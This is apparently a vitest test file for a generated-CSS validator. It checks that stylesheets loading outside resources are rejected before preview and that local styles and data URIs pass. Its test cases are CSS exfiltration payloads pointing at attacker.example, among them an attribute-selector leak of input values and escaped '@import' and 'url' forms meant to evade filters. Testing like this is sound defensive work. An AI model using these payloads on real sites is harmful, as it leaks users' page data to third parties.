import { describe, expect, it } from "vitest";
import { validateGeneratedCss } from "./generated-css.main";

describe("generated CSS resource validation", () => {
  it.each([
    'input[value^="a"] { background: url(https://attacker.example/a); }',
    '@import "https://attacker.example/theme.css";',
    '@\\69mport "https://attacker.example/theme.css";',
    "body { background: u\\72l(https://attacker.example/a); }",
    'body { background: image-set("https://attacker.example/a" 1x); }',
    'body { background: -webkit-image-set("https://attacker.example/a" 1x); }',
    '@font-face { src: src("https://attacker.example/a"); }',
    ":root { --leak: url(https://attacker.example/a); }",
    "body { background: url(/tracking); }",
  ])("rejects resources before automatic preview: %s", (source) => {
    expect(() => validateGeneratedCss(source)).toThrow("previous CSS is unchanged");
  });
  it("allows local style changes, selectors, and inline image data", () => {
    expect(() =>
      validateGeneratedCss(
        'article { max-width: 80rem; font-size: 1.2rem; } aside { display:none; } h1::after { content:"url(example)"; } body { background: url("data:image/png;base64,aGVsbG8="); }',
      ),
    ).not.toThrow();
  });
});
